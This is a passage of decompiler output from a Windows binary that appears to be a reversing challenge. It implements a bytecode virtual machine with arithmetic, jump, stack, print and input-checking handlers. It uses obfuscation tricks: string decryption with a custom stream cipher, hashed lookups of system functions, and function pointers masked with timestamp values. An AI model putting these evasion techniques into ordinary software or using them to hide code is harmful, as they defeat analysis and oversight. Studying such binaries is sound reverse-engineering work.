    plVar4 = (longlong *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    plVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    plVar1 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
    *plVar1 = *plVar1 + *plVar4;
    return;
  }
  DAT_140010260 = DAT_140010260 + *plVar4;
  return;
}


// ==== FUN_140004e70 @ 140004e70 size 91

void FUN_140004e70(longlong param_1)

{
  longlong *plVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  longlong *plVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
    plVar4 = (longlong *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    plVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    plVar1 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
    *plVar1 = *plVar1 - *plVar4;
    return;
  }
  DAT_140010260 = DAT_140010260 - *plVar4;
  return;
}


// ==== FUN_140004ed0 @ 140004ed0 size 83

void FUN_140004ed0(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong *plVar3;
  longlong *plVar4;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  plVar4 = &DAT_140010260;
  if ((byte)uVar2 < 8) {
    plVar3 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
  }
  else {
    plVar3 = &DAT_140010260;
  }
  if ((byte)uVar1 < 8) {
    plVar4 = (longlong *)(param_1 + (uVar1 & 0xff) * 8);
  }
  *plVar4 = *plVar3 * *plVar4;
  return;
}


// ==== FUN_140004f30 @ 140004f30 size 118

void FUN_140004f30(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong *puVar3;
  ulonglong *puVar4;
  longlong *plVar5;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  puVar4 = &DAT_140010260;
  plVar5 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
  if (7 < (byte)uVar2) {
    plVar5 = &DAT_140010260;
  }
  if (*plVar5 == 0) {
    *(undefined1 *)(param_1 + 0x48) = 0;
    return;
  }
  puVar3 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
  if (7 < (byte)uVar2) {
    puVar3 = &DAT_140010260;
  }
  if ((byte)uVar1 < 8) {
    puVar4 = (ulonglong *)(param_1 + (uVar1 & 0xff) * 8);
  }
  *puVar4 = *puVar4 / *puVar3;
  return;
}


// ==== FUN_140004fb0 @ 140004fb0 size 118

ulonglong FUN_140004fb0(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong *puVar3;
  ulonglong *puVar4;
  longlong *plVar5;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  puVar4 = &DAT_140010260;
  plVar5 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
  if (7 < (byte)uVar2) {
    plVar5 = &DAT_140010260;
  }
  if (*plVar5 == 0) {
    *(undefined1 *)(param_1 + 0x48) = 0;
    return uVar2;
  }
  puVar3 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
  if (7 < (byte)uVar2) {
    puVar3 = &DAT_140010260;
  }
  uVar2 = *puVar3;
  if ((byte)uVar1 < 8) {
    puVar4 = (ulonglong *)(param_1 + (uVar1 & 0xff) * 8);
  }
  uVar1 = *puVar4;
  *puVar4 = uVar1 % uVar2;
  return uVar1 / uVar2;
}


// ==== FUN_140005030 @ 140005030 size 91

void FUN_140005030(longlong param_1)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong *puVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
    puVar4 = (ulonglong *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    puVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    puVar1 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
    *puVar1 = *puVar1 ^ *puVar4;
    return;
  }
  DAT_140010260 = DAT_140010260 ^ *puVar4;
  return;
}


// ==== FUN_140005090 @ 140005090 size 91

void FUN_140005090(longlong param_1)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong *puVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
    puVar4 = (ulonglong *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    puVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    puVar1 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
    *puVar1 = *puVar1 & *puVar4;
    return;
  }
  DAT_140010260 = DAT_140010260 & *puVar4;
  return;
}


// ==== FUN_1400050f0 @ 1400050f0 size 91

void FUN_1400050f0(longlong param_1)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong *puVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
    puVar4 = (ulonglong *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    puVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    puVar1 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
    *puVar1 = *puVar1 | *puVar4;
    return;
  }
  DAT_140010260 = DAT_140010260 | *puVar4;
  return;
}


// ==== FUN_140005150 @ 140005150 size 44

void FUN_140005150(longlong param_1)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  
  uVar2 = FUN_140004850(param_1);
  if ((byte)uVar2 < 8) {
    puVar1 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
    *puVar1 = ~*puVar1;
    return;
  }
  DAT_140010260 = ~DAT_140010260;
  return;
}


// ==== FUN_140005180 @ 140005180 size 94

void FUN_140005180(longlong param_1)

{
  longlong *plVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
    puVar4 = (undefined8 *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    puVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    plVar1 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
    *plVar1 = *plVar1 << ((byte)*puVar4 & 0x3f);
    return;
  }
  DAT_140010260 = DAT_140010260 << ((byte)*puVar4 & 0x3f);
  return;
}


// ==== FUN_1400051e0 @ 1400051e0 size 94

void FUN_1400051e0(longlong param_1)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  if ((byte)uVar3 < 8) {
    puVar4 = (undefined8 *)(param_1 + (uVar3 & 0xff) * 8);
  }
  else {
    puVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    puVar1 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
    *puVar1 = *puVar1 >> ((byte)*puVar4 & 0x3f);
    return;
  }
  DAT_140010260 = DAT_140010260 >> ((byte)*puVar4 & 0x3f);
  return;
}


// ==== FUN_140005240 @ 140005240 size 83

void FUN_140005240(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong *plVar3;
  longlong *plVar4;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  plVar3 = &DAT_140010260;
  plVar4 = (longlong *)(param_1 + (uVar1 & 0xff) * 8);
  if (7 < (byte)uVar1) {
    plVar4 = &DAT_140010260;
  }
  if ((byte)uVar2 < 8) {
    plVar3 = (longlong *)(param_1 + (uVar2 & 0xff) * 8);
  }
  *(bool *)(param_1 + 0x49) = *plVar4 == *plVar3;
  return;
}


// ==== FUN_1400052a0 @ 1400052a0 size 54

void FUN_1400052a0(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  *(ulonglong *)(param_1 + 0x40) = (uVar2 & 0xff) << 8 | uVar1 & 0xff;
  return;
}


// ==== FUN_1400052e0 @ 1400052e0 size 60

void FUN_1400052e0(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  if (*(char *)(param_1 + 0x49) != '\0') {
    *(ulonglong *)(param_1 + 0x40) = (uVar2 & 0xff) << 8 | uVar1 & 0xff;
  }
  return;
}


// ==== FUN_140005320 @ 140005320 size 60

void FUN_140005320(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  if (*(char *)(param_1 + 0x49) == '\0') {
    *(ulonglong *)(param_1 + 0x40) = (uVar2 & 0xff) << 8 | uVar1 & 0xff;
  }
  return;
}


// ==== FUN_140005360 @ 140005360 size 78

void FUN_140005360(longlong param_1)

{
  ulonglong uVar1;
  undefined8 *puVar2;
  
  uVar1 = FUN_140004850(param_1);
  if ((byte)uVar1 < 8) {
    puVar2 = (undefined8 *)(param_1 + (uVar1 & 0xff) * 8);
  }
  else {
    puVar2 = &DAT_140010260;
  }
  if (*(ulonglong *)(param_1 + 600) < 0x40) {
    *(undefined8 *)(param_1 + 0x58 + *(ulonglong *)(param_1 + 600) * 8) = *puVar2;
    *(longlong *)(param_1 + 600) = *(longlong *)(param_1 + 600) + 1;
    return;
  }
  *(undefined1 *)(param_1 + 0x48) = 0;
  return;
}


// ==== FUN_1400053b0 @ 1400053b0 size 92

void FUN_1400053b0(longlong param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined8 uVar3;
  
  if (*(longlong *)(param_1 + 600) == 0) {
    *(undefined1 *)(param_1 + 0x48) = 0;
    uVar3 = 0;
  }
  else {
    lVar1 = *(longlong *)(param_1 + 600) + -1;
    *(longlong *)(param_1 + 600) = lVar1;
    uVar3 = *(undefined8 *)(param_1 + 0x58 + lVar1 * 8);
  }
  uVar2 = FUN_140004850(param_1);
  if ((byte)uVar2 < 8) {
    *(undefined8 *)(param_1 + (uVar2 & 0xff) * 8) = uVar3;
    return;
  }
  DAT_140010260 = uVar3;
  return;
}


// ==== FUN_140005410 @ 140005410 size 92

void FUN_140005410(longlong param_1)

{
  ulonglong uVar1;
  ulonglong uVar2;
  
  uVar1 = FUN_140004850(param_1);
  uVar2 = FUN_140004850(param_1);
  if (*(ulonglong *)(param_1 + 600) < 0x40) {
    *(undefined8 *)(param_1 + 0x58 + *(ulonglong *)(param_1 + 600) * 8) =
         *(undefined8 *)(param_1 + 0x40);
    *(longlong *)(param_1 + 600) = *(longlong *)(param_1 + 600) + 1;
  }
  else {
    *(undefined1 *)(param_1 + 0x48) = 0;
  }
  *(ulonglong *)(param_1 + 0x40) = (uVar2 & 0xff) << 8 | uVar1 & 0xff;
  return;
}


// ==== _guard_check_icall @ 1400054a0 size 3

void _guard_check_icall(void)

{
  return;
}


// ==== FUN_1400054c0 @ 1400054c0 size 251

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_1400054c0(longlong param_1)

{
  int iVar1;
  ulonglong uVar2;
  longlong lVar3;
  int iVar4;
  ulonglong uVar5;
  int iVar6;
  ulonglong *puVar7;
  undefined1 auStack_68 [31];
  char acStack_49 [25];
  char local_30 [24];
  ulonglong local_18;
  
  local_18 = DAT_140010000 ^ (ulonglong)auStack_68;
  uVar2 = FUN_140004850(param_1);
  if ((byte)uVar2 < 8) {
    puVar7 = (ulonglong *)(param_1 + (uVar2 & 0xff) * 8);
  }
  else {
    puVar7 = &DAT_140010260;
  }
  if (*puVar7 == 0) {
    local_30[0] = '0';
    local_30[1] = '\0';
    iVar6 = 1;
  }
  else {
    iVar6 = 0;
    uVar2 = *puVar7;
    do {
      uVar5 = uVar2 / 10;
      lVar3 = (longlong)iVar6;
      iVar6 = iVar6 + 1;
      acStack_49[lVar3 + 1] = (char)uVar2 + (char)uVar5 * -10 + '0';
      uVar2 = uVar5;
    } while (uVar5 != 0);
    iVar1 = 0;
    if (0 < iVar6) {
      do {
        lVar3 = (longlong)iVar1;
        iVar4 = iVar6 - iVar1;
        iVar1 = iVar1 + 1;
        acStack_49[lVar3 + 0x19] = acStack_49[iVar4];
      } while (iVar1 < iVar6);
    }
    acStack_49[(longlong)iVar6 + 0x19] = '\0';
  }
  acStack_49[(longlong)iVar6 + 0x19] = '\n';
  FUN_140002280((longlong)local_30,iVar6 + 1);
  FUN_1400022c0((longlong)local_30,0x16);
  return;
}


// ==== FUN_1400055c0 @ 1400055c0 size 686

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_1400055c0(longlong param_1)

{
  uint uVar1;
  bool bVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  longlong lVar9;
  uint uVar10;
  uint uVar11;
  ushort uVar12;
  uint uVar13;
  ushort uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  undefined1 auStack_88 [32];
  byte local_68;
  byte local_67;
  byte local_66;
  ulonglong local_60;
  undefined4 local_58;
  undefined1 local_54;
  ulonglong local_50;
  
  local_50 = DAT_140010000 ^ (ulonglong)auStack_88;
  uVar3 = FUN_140004850(param_1);
  local_66 = (byte)uVar3;
  uVar3 = FUN_140004850(param_1);
  local_67 = (byte)uVar3;
  uVar3 = FUN_140004850(param_1);
  local_68 = (byte)uVar3;
  uVar3 = FUN_140004850(param_1);
  uVar4 = FUN_140004850(param_1);
  uVar5 = FUN_140004850(param_1);
  uVar6 = FUN_140004850(param_1);
  uVar7 = FUN_140004850(param_1);
  lVar9 = param_1;
  uVar8 = FUN_140004850(param_1);
  uVar14 = (short)uVar5 << 8 | (ushort)uVar4 & 0xff;
  if (uVar14 != 0) {
    local_60 = (ulonglong)uVar14;
    lVar9 = FUN_140001a00(lVar9,(ulonglong)uVar14);
    if (lVar9 != 0) {
      uVar15 = ((uint)uVar3 & 0xff) << 8;
      uVar10 = (uint)local_68;
      uVar16 = ((uVar15 | uVar10) << 8 | (uint)local_67) << 8 | (uint)local_66;
      uVar3 = 0;
      if (uVar14 != 0) {
        do {
          uVar4 = FUN_140004850(param_1);
          uVar12 = (short)uVar3 + 1;
          *(char *)(uVar3 + lVar9) = (char)uVar4;
          uVar3 = (ulonglong)uVar12;
        } while (uVar12 < uVar14);
      }
      if ((((byte)uVar6 != 0) || ((byte)uVar7 != 0)) || (bVar2 = false, (byte)uVar8 != 0)) {
        FUN_140004a80((byte)uVar6,(byte)uVar7,(byte)uVar8);
        bVar2 = true;
      }
      uVar12 = 0;
      uVar13 = (uVar16 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
      if (uVar14 != 0) {
        uVar1 = (uVar16 ^ 0x64d7cf8) + uVar13;
        do {
          uVar3 = (ulonglong)uVar12;
          uVar17 = uVar12 ^ uVar1 ^ 0x99f0b3d4;
          uVar18 = uVar17 << 0x10 | uVar17 >> 0x10;
          uVar19 = uVar18 + (((uVar15 | uVar10) >> 3 | uVar16 << 0xd) ^ 0x13371337);
          uVar17 = uVar19 ^ uVar13;
          uVar11 = uVar17 << 0xc | uVar17 >> 0x14;
          uVar17 = uVar11 + uVar1;
          uVar18 = uVar17 ^ uVar18;
          uVar18 = uVar18 << 8 | uVar18 >> 0x18;
          uVar19 = uVar19 + uVar18;
          uVar11 = uVar19 ^ uVar11;
          uVar20 = uVar11 << 7 | uVar11 >> 0x19;
          uVar17 = uVar17 + uVar20;
          uVar18 = uVar18 ^ uVar17;
          uVar11 = uVar18 << 0x10 | uVar18 >> 0x10;
          uVar19 = uVar19 + uVar11;
          uVar20 = uVar20 ^ uVar19;
          uVar18 = uVar20 << 0xc | uVar20 >> 0x14;
          uVar17 = uVar17 + uVar18;
          uVar11 = uVar11 ^ uVar17;
          uVar11 = uVar11 << 8 | uVar11 >> 0x18;
          uVar19 = uVar19 + uVar11;
          uVar18 = uVar18 ^ uVar19;
          uVar18 = uVar18 << 7 | uVar18 >> 0x19;
          uVar17 = uVar17 + uVar18;
          uVar11 = uVar11 ^ uVar17;
          uVar11 = uVar11 << 0x10 | uVar11 >> 0x10;
          uVar19 = uVar19 + uVar11;
          uVar18 = uVar18 ^ uVar19;
          uVar18 = uVar18 << 0xc | uVar18 >> 0x14;
          uVar17 = uVar17 + uVar18;
          uVar11 = uVar11 ^ uVar17;
          uVar11 = uVar11 << 8 | uVar11 >> 0x18;
          uVar19 = uVar19 + uVar11;
          uVar18 = uVar18 ^ uVar19;
          uVar18 = uVar18 << 7 | uVar18 >> 0x19;
          uVar17 = uVar17 + uVar18;
          uVar11 = uVar11 ^ uVar17;
          uVar11 = uVar11 << 0x10 | uVar11 >> 0x10;
          uVar19 = uVar19 + uVar11;
          uVar18 = uVar18 ^ uVar19;
          uVar18 = uVar18 << 0xc | uVar18 >> 0x14;
          uVar17 = uVar17 + uVar18;
          uVar11 = uVar11 ^ uVar17;
          uVar11 = uVar11 << 8 | uVar11 >> 0x18;
          uVar19 = uVar19 + uVar11;
          uVar18 = uVar18 ^ uVar19;
          local_68 = (byte)(((uVar18 << 7 | uVar18 >> 0x19) ^ uVar11 ^ uVar19 ^ uVar17) >>
                           (sbyte)((uVar12 & 3) << 3)) ^ *(byte *)(uVar3 + lVar9);
          if (local_68 != 0) {
            FUN_1400021b0(local_68);
          }
          uVar12 = uVar12 + 1;
          local_68 = 0;
          *(undefined1 *)(uVar3 + lVar9) = 0;
        } while (uVar12 < uVar14);
      }
      if (bVar2) {
        local_58 = 0x6d305b1b;
        local_54 = 0;
        FUN_140002280((longlong)&local_58,4);
      }
      FUN_1400022c0(lVar9,local_60);
      FUN_140001bf0(lVar9);
      return;
    }
  }
  *(undefined1 *)(param_1 + 0x48) = 0;
  return;
}


// ==== FUN_140005890 @ 140005890 size 382

void FUN_140005890(longlong param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  uVar4 = FUN_140004850(param_1);
  uVar5 = FUN_140004850(param_1);
  uVar6 = FUN_140004850(param_1);
  if (*(longlong *)(param_1 + 0x260) != 0) {
    uVar2 = (uVar3 & 0xff) << 8 | uVar2 & 0xff;
    uVar3 = (uVar5 & 0xff) << 8 | uVar4 & 0xff;
    if (uVar3 + uVar2 < 0x10001) {
      lVar1 = uVar2 + *(longlong *)(param_1 + 0x260);
      if (DAT_1400102e0 == '\0') {
        DAT_1400102e0 = '\x01';
        uVar2 = rdtsc();
        local_68 = 0x158f3a1f;
        local_64 = 0x9b1a13fd;
        local_60 = 0x90a6;
        DAT_1400103c0 = uVar2 ^ 0x1fcecd49c;
        local_5c = 0x14;
        local_58 = 0xbdcac59b;
        local_54 = 0x23ec99d;
        local_50 = 0xc5b506a4;
        local_4c = 0x80fb;
        local_48 = 0x15;
        uVar2 = FUN_140008d00((longlong)&local_68,(longlong)&local_58);
        DAT_1400101f0 = uVar2 ^ DAT_1400103c0;
      }
      if ((code *)(DAT_1400101f0 ^ DAT_1400103c0) != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001400059d4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        (*(code *)(DAT_1400101f0 ^ DAT_1400103c0))(lVar1,uVar3,uVar6 & 0xff);
        return;
      }
      uVar2 = 0;
      if (uVar3 == 0) {
        return;
      }
      do {
        *(char *)(uVar2 + lVar1) = (char)uVar6;
        uVar2 = uVar2 + 1;
      } while (uVar2 < uVar3);
      return;
    }
  }
  *(undefined1 *)(param_1 + 0x48) = 0;
  return;
}


// ==== FUN_140005a10 @ 140005a10 size 230

void FUN_140005a10(longlong param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ushort uVar6;
  ushort uVar7;
  ushort uVar8;
  
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  uVar7 = (short)uVar3 << 8 | (ushort)uVar2 & 0xff;
  uVar2 = FUN_140004850(param_1);
  uVar3 = FUN_140004850(param_1);
  uVar4 = FUN_140004850(param_1);
  uVar5 = FUN_140004850(param_1);
  lVar1 = *(longlong *)(param_1 + 0x260);
  uVar8 = (short)uVar5 << 8 | (ushort)uVar4 & 0xff;
  if ((lVar1 != 0) && ((ulonglong)uVar7 + (ulonglong)uVar8 < 0x10001)) {
    uVar6 = (short)uVar3 << 8 | (ushort)uVar2 & 0xff;
    if ((((ulonglong)uVar8 + (ulonglong)uVar6 < 0x10001) &&
        ((uVar6 <= uVar7 || ((uint)uVar8 + (uint)uVar7 <= (uint)uVar6)))) &&
       ((uVar7 <= uVar6 || ((uint)uVar8 + (uint)uVar6 <= (uint)uVar7)))) {
      FUN_1400023d0((void *)((ulonglong)uVar7 + lVar1),(void *)((ulonglong)uVar6 + lVar1),
                    (ulonglong)uVar8);
      return;
    }
  }
  *(undefined1 *)(param_1 + 0x48) = 0;
  return;
}


// ==== FUN_140005b40 @ 140005b40 size 606

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140005b40(longlong param_1)

{
  uint uVar1;
  int iVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  code *pcVar6;
  longlong lVar7;
  ulonglong *puVar8;
  uint uVar9;
  longlong lVar10;
  uint uVar11;
  undefined1 auStack_b8 [32];
  undefined8 local_98;
  byte local_88;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined1 local_74;
  undefined2 local_73;
  undefined1 local_71;
  undefined4 local_70;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined1 local_5c;
  undefined2 local_5b;
  undefined1 local_59;
  undefined4 local_58;
  undefined4 local_50;
  undefined4 local_4c;
  undefined1 local_48;
  undefined2 local_47;
  undefined1 local_45;
  undefined4 local_44;
  int local_40 [2];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_b8;
  uVar3 = FUN_140004850(param_1);
  local_88 = (byte)uVar3;
  uVar3 = FUN_140004850(param_1);
  uVar4 = FUN_140004850(param_1);
  local_80 = 0x495f6980;
  local_7c = 0x2e58da24;
  local_78 = 0x768bff4;
  local_74 = 0x6c;
  local_73 = 0;
  local_71 = 0;
  local_70 = 0x37;
  local_50 = 0x84604588;
  local_4c = 0xb2d078c4;
  local_48 = 0xf3;
  local_47 = 0;
  local_45 = 0;
  local_44 = 0x38;
  local_68 = 0xe5719682;
  local_64 = 0xbd9b3b84;
  local_60 = 0x1c038979;
  local_5c = 2;
  local_5b = 0;
  local_59 = 0;
  local_58 = 0x39;
  if (DAT_1400102d0 == '\0') {
    DAT_1400102d0 = '\x01';
    uVar5 = rdtsc();
    DAT_140010340 = uVar5 ^ 0x150ab6170;
    uVar5 = FUN_14000ab00((longlong)&local_80,(longlong)&local_50);
    pcVar6 = (code *)FUN_140006f00((longlong)&local_80,(longlong)&local_68);
    DAT_140010280 = uVar5 ^ DAT_140010340;
    if (pcVar6 != (code *)0x0) {
      uVar5 = (*pcVar6)(0xfffffff6);
      DAT_140010078 = uVar5 ^ DAT_140010340;
    }
  }
  lVar7 = *(longlong *)(param_1 + 0x260);
  if (lVar7 == 0) {
    *(undefined1 *)(param_1 + 0x48) = 0;
  }
  else {
    uVar11 = ((uint)uVar4 & 0xff) << 8 | (uint)uVar3 & 0xff;
    uVar1 = 0xffff - uVar11;
    if (0xffff < uVar1) {
      uVar1 = 0xffff;
    }
    uVar9 = 0;
    if ((uVar1 & 0xffff) != 0) {
      pcVar6 = (code *)(DAT_140010280 ^ DAT_140010340);
      uVar3 = DAT_140010078 ^ DAT_140010340;
      do {
        local_40[0] = 0;
        if (pcVar6 == (code *)0x0) break;
        local_98 = 0;
        lVar10 = (longlong)(int)(uVar11 + uVar9);
        iVar2 = (*pcVar6)(uVar3,lVar10 + lVar7,1,local_40);
        if ((iVar2 == 0) || (local_40[0] == 0)) break;
        lVar7 = *(longlong *)(param_1 + 0x260);
        if ((*(char *)(lVar10 + lVar7) == '\r') || (*(char *)(lVar10 + lVar7) == '\n')) {
          *(undefined1 *)(lVar10 + lVar7) = 0;
          break;
        }
        uVar9 = uVar9 + 1;
      } while ((int)uVar9 < (int)(uVar1 & 0xffff));
    }
    *(undefined1 *)((longlong)(int)(uVar11 + uVar9) + *(longlong *)(param_1 + 0x260)) = 0;
    puVar8 = (ulonglong *)(param_1 + (ulonglong)local_88 * 8);
    if (7 < local_88) {
      puVar8 = &DAT_140010260;
    }
    *puVar8 = (ulonglong)uVar9;
  }
  return;
}


// ==== FUN_140005da0 @ 140005da0 size 870

void FUN_140005da0(longlong param_1)

{
  uint uVar1;
  byte bVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  ulonglong uVar11;
  longlong lVar12;
  ulonglong *puVar13;
  byte bVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  ushort uVar18;
  ushort uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  ushort uVar23;
  uint uVar24;
  byte bVar25;
  ushort uVar26;
  
  uVar3 = FUN_140004850(param_1);
  uVar4 = FUN_140004850(param_1);
  uVar5 = FUN_140004850(param_1);
  uVar6 = FUN_140004850(param_1);
  uVar7 = FUN_140004850(param_1);
  uVar8 = FUN_140004850(param_1);
  uVar9 = FUN_140004850(param_1);
  uVar10 = FUN_140004850(param_1);
  lVar12 = param_1;
  uVar11 = FUN_140004850(param_1);
  uVar18 = (short)uVar11 << 8 | (ushort)uVar10 & 0xff;
  if ((*(longlong *)(param_1 + 0x4c0) != 0) && (*(longlong *)(param_1 + 0x4c8) != 0)) {
    uVar26 = (short)uVar5 << 8 | (ushort)uVar4 & 0xff;
    uVar4 = (ulonglong)uVar26;
    if ((*(longlong *)(param_1 + 0x260) != 0) &&
       (((uVar18 != 0 && (uVar5 = (ulonglong)uVar18, uVar4 + uVar5 < 0x10000)) &&
        (lVar12 = FUN_140001a00(lVar12,uVar5), lVar12 != 0)))) {
      uVar10 = 0;
      uVar17 = (uint)CONCAT21(CONCAT11((char)uVar9,(char)uVar8),(char)uVar7) << 8 |
               (uint)uVar6 & 0xff;
      if (uVar18 != 0) {
        do {
          uVar6 = FUN_140004850(param_1);
          uVar19 = (short)uVar10 + 1;
          *(char *)(uVar10 + lVar12) = (char)uVar6;
          uVar10 = (ulonglong)uVar19;
        } while (uVar19 < uVar18);
      }
      uVar19 = 0xffff;
      uVar23 = 0;
      uVar22 = (uVar17 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
      if ((0xffff < 0xffff - uVar26) || (uVar19 = (ushort)(0xffff - uVar26), uVar19 != 0)) {
        do {
          if (*(char *)((ulonglong)uVar23 + uVar4 + *(longlong *)(param_1 + 0x260)) == '\0') break;
          uVar23 = uVar23 + 1;
        } while (uVar23 < uVar19);
      }
      bVar25 = 0;
      if (uVar23 != uVar18) {
        bVar25 = 0xff;
      }
      uVar19 = 0;
      if (uVar18 != 0) {
        uVar1 = (uVar17 ^ 0x64d7cf8) + uVar22;
        do {
          uVar24 = (uint)uVar19;
          uVar20 = uVar19 ^ uVar1 ^ 0x99f0b3d4;
          uVar21 = uVar20 << 0x10 | uVar20 >> 0x10;
          uVar20 = uVar21 + (((uint)(ushort)(CONCAT11((char)uVar9,(char)uVar8) >> 3) | uVar17 << 0xd
                             ) ^ 0x13371337);
          uVar15 = uVar20 ^ uVar22;
          uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
          uVar15 = uVar1 + uVar16;
          uVar21 = uVar15 ^ uVar21;
          uVar21 = uVar21 << 8 | uVar21 >> 0x18;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar20 ^ uVar16;
          uVar16 = uVar16 << 7 | uVar16 >> 0x19;
          uVar15 = uVar15 + uVar16;
          uVar21 = uVar21 ^ uVar15;
          uVar21 = uVar21 << 0x10 | uVar21 >> 0x10;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar16 ^ uVar20;
          uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
          uVar15 = uVar15 + uVar16;
          uVar21 = uVar21 ^ uVar15;
          uVar21 = uVar21 << 8 | uVar21 >> 0x18;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar16 ^ uVar20;
          uVar16 = uVar16 << 7 | uVar16 >> 0x19;
          uVar15 = uVar15 + uVar16;
          uVar21 = uVar21 ^ uVar15;
          uVar21 = uVar21 << 0x10 | uVar21 >> 0x10;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar16 ^ uVar20;
          uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
          uVar15 = uVar15 + uVar16;
          uVar21 = uVar21 ^ uVar15;
          uVar21 = uVar21 << 8 | uVar21 >> 0x18;
          uVar20 = uVar20 + uVar21;
          uVar16 = uVar16 ^ uVar20;
          uVar16 = uVar16 << 7 | uVar16 >> 0x19;
          uVar15 = uVar15 + uVar16;
